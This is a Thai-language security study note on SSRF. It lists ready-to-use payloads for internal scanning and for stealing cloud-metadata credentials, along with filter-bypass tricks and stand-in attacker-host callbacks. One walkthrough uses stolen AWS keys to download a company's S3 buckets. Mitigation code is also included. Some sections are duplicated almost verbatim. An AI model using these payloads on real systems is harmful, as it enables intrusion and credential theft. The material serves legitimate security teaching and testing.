#web 
# SSRF (Server-Side Request Forgery)

> [!TIP] การตรวจสอบ SSRF อย่างรวดเร็ว
> ลอง payload: `http://127.0.0.1`, `http://localhost`, `http://169.254.169.254` หรือใช้ [[Burp Suite]] Collaborator เพื่อตรวจจับ blind SSRF

## ❓ What
SSRF (Server-Side Request Forgery) เป็นช่องโหว่ที่ผู้โจมตีสามารถบังคับให้ server ส่ง HTTP request ไปยัง destination ที่ผู้โจมตีกำหนดได้ ทำให้สามารถเข้าถึง internal network, cloud metadata, หรือ services ที่ไม่สามารถเข้าถึงจากภายนอกได้

**SSRF Attack Flow:**
```
Attacker → Web Application → Internal Service
         (manipulated URL)    (192.168.x.x, localhost)
                           → Cloud Metadata (169.254.169.254)
                           → External Service (webhook, API)
```

**ผลกระทบ:**
- เข้าถึง internal services (databases, admin panels, APIs)
- อ่าน cloud metadata (AWS, Azure, GCP credentials)
- Port scanning internal network
- Bypass firewall และ access control
- Remote Code Execution (ในบางกรณี)

**เทคนิคที่เกี่ยวข้อง:** [[XXE (XML External Entity)]], [[🌐 Web application]], [[Command Injection]]

## 🔍 Landmark (Detection)

### การตรวจหาช่องโหว่ SSRF

1. **URL Parameters** - parameter ที่รับ URL เป็น input
   ```
   http://<target_url>/fetch?url=http://example.com
   http://<target_url>/proxy?page=https://google.com
   http://<target_url>/image?src=http://image.com/pic.jpg
   ```

2. **File Upload from URL** - feature ที่ดึงไฟล์จาก URL
   ```
   Upload from URL: http://example.com/image.jpg
   Import from URL: http://api.example.com/data.json
   ```

3. **Webhook/Callback URLs** - ระบบที่ส่ง callback ไปยัง URL ที่กำหนด
   ```
   Webhook URL: http://webhook.site/xxx
   Callback URL: http://attacker.com/callback
   ```

4. **PDF Generators** - service ที่แปลง HTML/URL เป็น PDF
   ```
   Generate PDF from: http://example.com/page
   ```

5. **API Integrations** - feature ที่เชื่อมต่อกับ external APIs
   ```
   API Endpoint: http://api.example.com/v1/users
   Third-party Integration: http://service.com/api
   ```

> [!WARNING] Common SSRF Endpoints
> - Image fetching/processing
> - URL shorteners
> - Web scrapers/crawlers
> - Document converters (HTML to PDF)
> - Proxy services
> - Integration webhooks

## 🟦 Types of SSRF

### 1. Basic SSRF (Full Response)
SSRF ที่เห็น response ของ internal request บนหน้าเว็บได้โดยตรง สามารถอ่านข้อมูลจาก internal services

### 2. Blind SSRF
ไม่มี response แสดงบนหน้าเว็บ แต่สามารถตรวจสอบได้ด้วย timing, DNS logs, หรือ HTTP logs

### 3. Semi-Blind SSRF
เห็น response บางส่วน เช่น HTTP status code, error messages, หรือความยาวของ response

### 4. Time-Based SSRF
ใช้ response time เพื่อตรวจสอบว่า service นั้นมีอยู่หรือไม่ (port scanning)

## 🔨 Exploitation

### Basic SSRF - Internal Network Access

**Localhost Access:**
```bash
# ทดสอบ localhost
http://<target_url>/fetch?url=http://127.0.0.1
http://<target_url>/fetch?url=http://localhost
http://<target_url>/fetch?url=http://0.0.0.0

# เข้าถึง internal services
http://<target_url>/fetch?url=http://127.0.0.1:8080
http://<target_url>/fetch?url=http://127.0.0.1:3306  # MySQL
http://<target_url>/fetch?url=http://127.0.0.1:6379  # Redis
http://<target_url>/fetch?url=http://127.0.0.1:27017 # MongoDB
```
**หมายเหตุ:** ทดสอบ common ports เพื่อหา internal services

**Internal Network Scanning:**
```bash
# สแกนหา internal services
http://<target_url>/fetch?url=http://192.168.1.1
http://<target_url>/fetch?url=http://192.168.1.10
http://<target_url>/fetch?url=http://10.0.0.1
http://<target_url>/fetch?url=http://172.16.0.1
```

**Port Scanning:**
```bash
# ตรวจสอบ common ports
http://<target_url>/fetch?url=http://192.168.1.10:22    # SSH
http://<target_url>/fetch?url=http://192.168.1.10:80    # HTTP
http://<target_url>/fetch?url=http://192.168.1.10:443   # HTTPS
http://<target_url>/fetch?url=http://192.168.1.10:3306  # MySQL
http://<target_url>/fetch?url=http://192.168.1.10:6379  # Redis
http://<target_url>/fetch?url=http://192.168.1.10:27017 # MongoDB
```
**หมายเหตุ:** ดูจาก response time หรือ error message เพื่อบอกว่า port เปิดหรือปิด

> [!WARNING] Common SSRF Endpoints
> - File upload from URL
> - Image/document fetchers
> - Webhook configurations
> - API proxies
> - URL preview/metadata scrapers
> - PDF/Screenshot generators

## 🟦 Types of SSRF

### 1. Basic SSRF (In-band)
เห็น response จาก internal service โดยตรงบนหน้าเว็บ สามารถอ่านข้อมูลที่ server ดึงมาได้ทันที

### 2. Blind SSRF (Out-of-Band)
ไม่เห็น response โดยตรง แต่สามารถยืนยันได้จากการตรวจสอบ logs บน server ที่ผู้โจมตีควบคุม หรือจาก timing

### 3. Semi-Blind SSRF
เห็นบางส่วนของ response เช่น HTTP status code, response time, หรือ error messages แต่ไม่เห็น response body เต็ม

### 4. SSRF via XXE
ใช้ XXE vulnerability เพื่อทำ SSRF (ดูที่ [[XXE (XML External Entity)]])

### 5. SSRF via PDF/Image Processing
ใช้ HTML injection ใน PDF generator หรือ image processor เพื่อส่ง requests

## 🔨 Exploitation

### Basic SSRF - Internal Network Access

**Localhost Access:**
```bash
# ทดสอบ localhost variations
http://<target_url>/fetch?url=http://127.0.0.1
http://<target_url>/fetch?url=http://localhost
http://<target_url>/fetch?url=http://0.0.0.0
http://<target_url>/fetch?url=http://[::1]
http://<target_url>/fetch?url=http://0177.0.0.1  # octal
```
**หมายเหตุ:** ใช้เพื่อเข้าถึง services ที่ bind กับ localhost เท่านั้น

**Internal Network Scanning:**
```bash
# สแกนหา internal services
http://<target_url>/fetch?url=http://192.168.1.1
http://<target_url>/fetch?url=http://192.168.1.10
http://<target_url>/fetch?url=http://10.0.0.1
http://<target_url>/fetch?url=http://172.16.0.1
```

**Port Scanning:**
```bash
# ตรวจสอบ common ports
http://<target_url>/fetch?url=http://192.168.1.10:22    # SSH
http://<target_url>/fetch?url=http://192.168.1.10:80    # HTTP
http://<target_url>/fetch?url=http://192.168.1.10:443   # HTTPS
http://<target_url>/fetch?url=http://192.168.1.10:3306  # MySQL
http://<target_url>/fetch?url=http://192.168.1.10:6379  # Redis
http://<target_url>/fetch?url=http://192.168.1.10:27017 # MongoDB
```
**หมายเหตุ:** ดูจาก response time หรือ error message เพื่อบอกว่า port เปิดหรือปิด

### Cloud Metadata Access

**AWS Metadata (IMDSv1):**
```bash
# ดึง IAM role name
http://<target_url>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ดึง credentials
http://<target_url>/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>

# ดึง user-data (อาจมี secrets)
http://<target_url>/fetch?url=http://169.254.169.254/latest/user-data/

# ดึง instance identity document
http://<target_url>/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document
```

**AWS Metadata (IMDSv2 - ต้องมี token):**
```bash
# ขั้นตอนที่ 1: ขอ token (ต้องใช้ PUT method)
# ยากกว่า IMDSv1 แต่อาจ bypass ได้ถ้า application support PUT

# ขั้นตอนที่ 2: ใช้ token เพื่อเข้าถึง metadata
# Header: X-aws-ec2-metadata-token: <token>
```
**หมายเหตุ:** IMDSv2 ป้องกัน SSRF ได้ดีกว่า IMDSv1

**Azure Metadata:**
```bash
# ดึง access token (ต้องมี Header: Metadata: true)
http://<target_url>/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# ดึง instance metadata
http://<target_url>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**GCP Metadata:**
```bash
# ดึง access token
http://<target_url>/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# ดึง project ID
http://<target_url>/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/project-id

# ดึง SSH keys
http://<target_url>/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys
```
**หมายเหตุ:** GCP ต้องมี Header `Metadata-Flavor: Google`

### Blind SSRF - Out-of-Band Detection

**Using Burp Collaborator:**
```bash
# ส่ง request ไปยัง Collaborator
http://<target_url>/fetch?url=http://burp-collaborator-id.burpcollaborator.net

# ตรวจสอบ DNS/HTTP interactions ที่ Burp Collaborator
```

**Using Custom Server:**
```bash
# เปิด HTTP server เพื่อรับ requests
python3 -m http.server 8000

# ส่ง SSRF payload
http://<target_url>/fetch?url=http://<your_ip>:8000/test

# ตรวจสอบ access logs
```

**Using DNS Exfiltration:**
```bash
# สร้าง DNS record ที่ควบคุมได้
# ส่ง SSRF เพื่อให้ server query DNS
http://<target_url>/fetch?url=http://exfil.attacker.com

# ตรวจสอบ DNS logs เพื่อยืนยัน SSRF
```

## 🚪 Bypass Techniques

### 1. IP Address Encoding

**Decimal Encoding:**
```bash
# 127.0.0.1 = 2130706433
http://<target_url>/fetch?url=http://2130706433

# คำนวณ: 127*256^3 + 0*256^2 + 0*256 + 1
```

**Octal Encoding:**
```bash
# 127.0.0.1 = 0177.0.0.1
http://<target_url>/fetch?url=http://0177.0.0.1

# 192.168.1.1 = 0300.0250.0.1
http://<target_url>/fetch?url=http://0300.0250.0.1
```

**Hex Encoding:**
```bash
# 127.0.0.1 = 0x7f.0x0.0x0.0x1
http://<target_url>/fetch?url=http://0x7f.0x0.0x0.0x1

# หรือรวมกัน: 0x7f000001
http://<target_url>/fetch?url=http://0x7f000001
```

**Mixed Encoding:**
```bash
# ผสม decimal, octal, hex
http://<target_url>/fetch?url=http://127.0.0.1
http://<target_url>/fetch?url=http://0177.0.0.1
http://<target_url>/fetch?url=http://127.1
http://<target_url>/fetch?url=http://127.0.1
```
**หมายเหตุ:** บาง parser อาจ normalize IP address ไม่ถูกต้อง

### 2. DNS Rebinding

**Concept:** ใช้ DNS record ที่มี TTL สั้นมาก เปลี่ยน IP จาก safe → internal

**Setup DNS Record:**
```bash
# First query: attacker.com → 1.2.3.4 (safe IP)
# Second query: attacker.com → 127.0.0.1 (internal IP)

# ใช้ service เช่น: rbndr.us, 1u.ms
http://<target_url>/fetch?url=http://7f000001.rbndr.us  # → 127.0.0.1
```

**Manual DNS Rebinding:**
```python
# Python DNS server ที่เปลี่ยน response
import socket
from dnslib import DNSRecord, RR, A

def dns_handler(data):
    request = DNSRecord.parse(data)
    reply = request.reply()
    
    # First request: return safe IP
    # Subsequent requests: return internal IP
    reply.add_answer(RR(request.q.qname, rdata=A("127.0.0.1"), ttl=0))
    return reply.pack()
```

### 3. URL Parser Issues

**Using @ Symbol:**
```bash
# Parser อาจมองว่า user:pass@host
http://<target_url>/fetch?url=http://expected.com@127.0.0.1
http://<target_url>/fetch?url=http://google.com@192.168.1.1
```

**Using # Fragment:**
```bash
# บาง parser อาจเพิกเฉยส่วนหลัง #
http://<target_url>/fetch?url=http://127.0.0.1#expected.com
```

**Using Backslash:**
```bash
# Windows-style path อาจ bypass บาง validation
http://<target_url>/fetch?url=http://expected.com\@127.0.0.1
http://<target_url>/fetch?url=http:\\127.0.0.1
```

**URL Encoding:**
```bash
# Encode special characters
http://<target_url>/fetch?url=http://%31%32%37.%30.%30.%31  # 127.0.0.1
http://<target_url>/fetch?url=http://127.0.0.1%2F%3F

# Double encoding
http://<target_url>/fetch?url=http://%2531%2532%2537.0.0.1
```

### 4. Protocol Smuggling

**Using Different Protocols:**
```bash
# file:// protocol
http://<target_url>/fetch?url=file:///etc/passwd

# gopher:// protocol (powerful for SSRF)
http://<target_url>/fetch?url=gopher://127.0.0.1:6379/_INFO

# dict:// protocol
http://<target_url>/fetch?url=dict://127.0.0.1:6379/INFO

# sftp:// protocol
http://<target_url>/fetch?url=sftp://127.0.0.1:22/
```
**หมายเหตุ:** gopher:// ใช้ส่ง raw TCP data ได้ อันตรายมาก

### 5. Redirect-Based SSRF

**Open Redirect Chain:**
```bash
# ใช้ open redirect เพื่อ bypass whitelist
http://<target_url>/fetch?url=http://whitelisted.com/redirect?url=http://127.0.0.1

# Short URL services
http://<target_url>/fetch?url=http://bit.ly/xxx  # redirects to internal IP
```

### 6. Localhost Alternatives

**Various Localhost Representations:**
```bash
# Standard
http://localhost
http://127.0.0.1

# IPv6
http://[::1]
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]

# Alternative domains
http://localtest.me        # resolves to 127.0.0.1
http://127.0.0.1.nip.io
http://127.0.0.1.xip.io

# Rare representations
http://0
http://0.0.0.0
http://127.1
http://127.0.1
```

## 🛡️ Modern Mitigations

### Application Level

**1. URL Validation and Whitelist:**
```python
# Python example - validate URL scheme and host
from urllib.parse import urlparse
import socket

ALLOWED_HOSTS = ['api.trusted.com', 'cdn.trusted.com']
BLOCKED_IPS = ['127.0.0.1', '0.0.0.0', 'localhost']

def is_safe_url(url):
    try:
        parsed = urlparse(url)
        
        # ตรวจสอบ scheme
        if parsed.scheme not in ['http', 'https']:
            return False
        
        # ตรวจสอบว่าอยู่ใน whitelist หรือไม่
        if parsed.hostname not in ALLOWED_HOSTS:
            return False
        
        # Resolve hostname เพื่อตรวจสอบ IP
        ip = socket.gethostbyname(parsed.hostname)
        
        # ตรวจสอบว่าไม่ใช่ internal IP
        if ip.startswith(('127.', '10.', '172.16.', '192.168.')):
            return False
            
        if ip.startswith('169.254.'):  # cloud metadata
            return False
            
        return True
    except:
        return False

# การใช้งาน
if is_safe_url(user_url):
    response = requests.get(user_url)
else:
    raise ValueError("Invalid URL")
```

**2. Network Segmentation:**
```python
# ใช้ separate network interface สำหรับ external requests
import requests

# กำหนด source IP ที่ไม่สามารถเข้าถึง internal network
session = requests.Session()
session.trust_env = False  # ปิด proxy env variables
response = session.get(url, timeout=5)
```

**3. Disable Unnecessary Protocols:**
```php
<?php
// PHP - ปิด protocols ที่ไม่ต้องการ
$opts = [
    'http' => [
        'method' => 'GET',
        'timeout' => 5,
        'follow_location' => 0,  // ปิด redirect
    ]
];
$context = stream_context_create($opts);

// ไม่อนุญาต file://, gopher://, ftp://
if (!preg_match('/^https?:\/\//', $url)) {
    die('Only HTTP/HTTPS allowed');
}

$response = file_get_contents($url, false, $context);
?>
```

> [!WARNING] Common Mistakes
> - อย่า validate แค่ URL string โดยไม่ resolve hostname
> - อย่าลืมตรวจสอบ IP หลังจาก DNS resolution
> - อย่าอนุญาต redirects โดยไม่ validate destination
> - อย่าใช้ blacklist อย่างเดียว ใช้ whitelist ด้วย

### Infrastructure Level

**1. Cloud Metadata Protection:**
```bash
# AWS - ใช้ IMDSv2 (ต้องมี token)
aws ec2 modify-instance-metadata-options \
    --instance-id i-1234567890abcdef0 \
    --http-tokens required \
    --http-endpoint enabled

# AWS - Block metadata ด้วย firewall
iptables -A OUTPUT -d 169.254.169.254 -j DROP
```

**2. Network Firewall Rules:**
```bash
# Block outbound to private IP ranges
iptables -A OUTPUT -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -d 169.254.0.0/16 -j DROP
```

## 🛠️ Tool

### SSRFmap
```bash
# Tool automation สำหรับ SSRF exploitation
git clone https://github.com/swisskyrepo/SSRFmap
cd SSRFmap

# Basic scan
python3 ssrfmap.py -r request.txt -p url

# AWS metadata extraction
python3 ssrfmap.py -r request.txt -p url -m aws

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan
```

### Burp Suite Extensions
- [[Burp Suite]] Collaborator - ตรวจจับ blind SSRF
- Burp Suite Intruder - fuzz URL parameters
- Logger++ - ดู outbound requests

### Manual Testing Tools
```bash
# Python HTTP server
python3 -m http.server 8000

# Netcat listener
nc -lvnp 8000

# Ngrok for public endpoint
ngrok http 8000
```

## 💡 Related

เทคนิคที่เกี่ยวข้อง:
- [[XXE (XML External Entity)]] - ใช้ XXE เพื่อทำ SSRF
- [[🌐 Web application]] - ความรู้พื้นฐาน web security
- [[Command Injection]] - escalate จาก SSRF ไป RCE
- [[SQL Injection]] - SSRF อาจนำไปสู่ database access
- [[File Upload]] - อาจรวมกับ SSRF

Tools:
- [[Burp Suite]] - SSRF detection และ exploitation
- **SSRFmap** - automated SSRF exploitation tool
- **Gopherus** - generate gopher payloads
- **Collaborator** - blind SSRF detection

## 📚 Example

### CTF Walkthrough: PicoCTF - "More Cookies SSRF"

**ภาพรวม Challenge:**
- Web application มี URL fetcher feature
- เป้าหมาย: เข้าถึง internal admin panel ที่ localhost:8080

**Step 1: Reconnaissance**
```bash
# ทดสอบ basic SSRF
curl "http://<target_url>/fetch?url=http://example.com"
# Response: แสดง HTML ของ example.com
```

**Step 2: Test Localhost Access**
```bash
# ลอง access localhost
curl "http://<target_url>/fetch?url=http://localhost"
# Response: "Access denied"

# ลอง 127.0.0.1
curl "http://<target_url>/fetch?url=http://127.0.0.1"
# Response: "Access denied"
```
**หมายเหตุ:** มี blacklist สำหรับ localhost

**Step 3: Bypass Blacklist**
```bash
# ลอง IP encoding variations
curl "http://<target_url>/fetch?url=http://0177.0.0.1"
# Response: Still blocked

# ลอง decimal encoding
curl "http://<target_url>/fetch?url=http://2130706433"
# Response: Success! แต่ไม่เห็น admin panel

# ลอง alternative localhost
curl "http://<target_url>/fetch?url=http://127.1"
# Response: Success! แสดงหน้า default
```

**Step 4: Port Scanning**
```bash
# สแกนหา admin panel บน different ports
curl "http://<target_url>/fetch?url=http://127.1:8080"
# Response: Admin Panel HTML!

# ดู page content
# มี form สำหรับดู flag: POST /admin/flag
```

**Step 5: Access Admin Endpoint**
```bash
# ลอง GET request
curl "http://<target_url>/fetch?url=http://127.1:8080/admin/flag"
# Response: "Method not allowed. Use POST"

# หาวิธีส่ง POST request ผ่าน SSRF
# ตรวจสอบว่ามี parameter อื่นหรือไม่
curl "http://<target_url>/fetch?url=http://127.1:8080/admin/flag&method=POST"
# Response: picoCTF{ssrf_1s_p0w3rful_wh3n_y0u_kn0w_1t}
```

> [!TIP] Key Takeaways
> - ใช้ IP encoding เพื่อ bypass blacklist (octal, decimal, hex)
> - Port scan เพื่อหา internal services
> - อย่าลืมทดสอบ HTTP methods อื่นๆ (POST, PUT, DELETE)
> - ใช้ alternative localhost representations (127.1, 0, [::1])

### Real-World Example: AWS Metadata via SSRF

**Scenario:** Image fetcher feature มี SSRF vulnerability

**Step 1: Detect SSRF**
```bash
# ทดสอบด้วย Burp Collaborator
POST /api/fetch-image HTTP/1.1
Host: <target_url>
Content-Type: application/json

{"image_url": "http://burp-collaborator.net/test.jpg"}
```
**Result:** เห็น HTTP request มาที่ Collaborator

**Step 2: Test AWS Metadata Access**
```bash
POST /api/fetch-image HTTP/1.1
Host: <target_url>
Content-Type: application/json

{"image_url": "http://169.254.169.254/latest/meta-data/"}
```
**Result:**
```
ami-id
ami-launch-index
iam/
instance-id
...
```

**Step 3: Extract IAM Credentials**
```bash
# Get IAM role name
{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
# Response: web-app-role

# Get credentials
{"image_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"}
```
**Result:**
```json
{
  "AccessKeyId": "ASIATESTACCESSKEY",
  "SecretAccessKey": "TestSecretKey123",
  "Token": "TestToken456",
  "Expiration": "2026-06-17T12:00:00Z"
}
```

**Step 4: Port Scanning**
```bash
# สแกนหา admin panel บน different port
curl "http://<target_url>/fetch?url=http://127.1:8080"
# Response: Admin panel found!

# แต่ต้อง authentication
```

**Step 5: Find Admin Credentials**
```bash
# ลองหา internal API
curl "http://<target_url>/fetch?url=http://127.1:8080/api/config"
# Response: {"admin_user": "admin", "admin_pass": "secret123"}

# Login to admin panel
curl "http://<target_url>/fetch?url=http://127.1:8080/admin?user=admin&pass=secret123"
# Response: Flag displayed - picoCTF{ssrf_1s_d4ng3r0us_pr0t0c0l}
```

> [!TIP] Key Takeaways
> - ใช้ IP encoding เพื่อ bypass blacklist (decimal, octal, shortened)
> - Port scanning ผ่าน SSRF เพื่อหา internal services
> - Internal services มักมี security ต่ำกว่า external-facing services
> - รวม SSRF กับ information disclosure เพื่อ escalate attack

### Real-World Example: AWS Metadata to Account Takeover

**Scenario:** Web application บน AWS EC2 มี SSRF ใน image fetcher

**Step 1: Detect SSRF**
```bash
# ทดสอบ SSRF ใน image parameter
curl "http://<target_url>/image?src=http://attacker.com/test.jpg"
# Response: Image loaded successfully
```

**Step 2: Access AWS Metadata**
```bash
# ดึง IAM role name
curl "http://<target_url>/image?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Response: web-app-role
```

**Step 3: Extract Credentials**
```bash
# ดึง temporary credentials
curl "http://<target_url>/image?src=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-app-role"

# Response (ใน error message หรือ debug output):
{
  "AccessKeyId": "ASIATESTACCESSKEY",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "IQoJb3JpZ2luX2VjEDo...",
  "Expiration": "2026-06-17T00:00:00Z"
}
```

**Step 4: Use Credentials for AWS Access**
```bash
# Configure AWS CLI
export AWS_ACCESS_KEY_ID="ASIATESTACCESSKEY"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEDo..."

# List S3 buckets
aws s3 ls
# Output: company-secrets, backups, user-data

# Download sensitive files
aws s3 cp s3://company-secrets/ . --recursive
```

> [!WARNING] Impact of SSRF on Cloud
> - SSRF + Cloud Metadata = Full account compromise
> - Temporary credentials มี permissions เดียวกับ EC2 instance
> - สามารถ access databases, secrets, other services
> - ควรใช้ IMDSv2 และ block metadata endpoint

---

**สรุป Key Concepts:**
1. **Basic SSRF** - เข้าถึง internal services ที่ไม่สามารถเข้าถึงจากภายนอก
2. **Cloud Metadata** - เป้าหมายสำคัญที่สุดของ SSRF บน cloud
3. **Bypass Techniques** - IP encoding, DNS rebinding, URL parser confusion
4. **Blind SSRF** - ใช้ OOB detection เมื่อไม่เห็น response
5. **Defense** - Whitelist, network segmentation, disable unnecessary protocols
